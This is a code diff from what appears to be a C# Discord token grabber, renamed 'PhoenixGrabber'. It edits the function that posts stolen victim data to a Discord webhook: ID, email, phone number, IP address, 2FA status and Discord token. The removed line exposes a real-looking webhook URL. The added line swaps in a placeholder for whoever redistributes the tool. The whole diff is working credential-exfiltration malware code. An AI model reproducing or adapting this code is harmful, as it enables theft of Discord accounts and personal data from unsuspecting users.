@@ -272,12 +272,12 @@ internal static class Program
 	{
 		try
 		{
-			WebRequest webRequest = WebRequest.Create("https://discord.com/api/webhooks/1007363061608362076/6Trk5IL6IFjtrs88ykexS8UFDehzfwZQVI8ikfa3VlKA1tcv7Gn7HaSRO5Ex147XNJ1a");
+			WebRequest webRequest = WebRequest.Create("UR WEBHOOK LINK HERE");
 			webRequest.ContentType = "application/json";
 			webRequest.Method = "POST";
 			using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
 			{
-				streamWriter.Write("{\"username\":\"StupidBot\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Biography\",\"value\":\"" + field4 + "\"},{\"name\":\"Locale\",\"value\":\"" + field5 + "\"},{\"name\":\"Badges\",\"value\":\"" + field6 + "\"},{\"name\":\"2FA Enabled\",\"value\":\"" + field7 + "\"},{\"name\":\"Status\",\"value\":\"" + field8 + "\"},{\"name\":\"Avatar\",\"value\":\"" + field9 + "\"},{\"name\":\"IP Address\",\"value\":\"" + field10 + "\"},{\"name\":\"Discord Token\",\"value\":\"" + field11 + "\"}]}]}");
+				streamWriter.Write("{\"username\":\"PhoenixGrabber\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Biography\",\"value\":\"" + field4 + "\"},{\"name\":\"Locale\",\"value\":\"" + field5 + "\"},{\"name\":\"Badges\",\"value\":\"" + field6 + "\"},{\"name\":\"2FA Enabled\",\"value\":\"" + field7 + "\"},{\"name\":\"Status\",\"value\":\"" + field8 + "\"},{\"name\":\"Avatar\",\"value\":\"" + field9 + "\"},{\"name\":\"IP Address\",\"value\":\"" + field10 + "\"},{\"name\":\"Discord Token\",\"value\":\"" + field11 + "\"}]}]}");
 			}
 			webRequest.GetResponse();
 		}
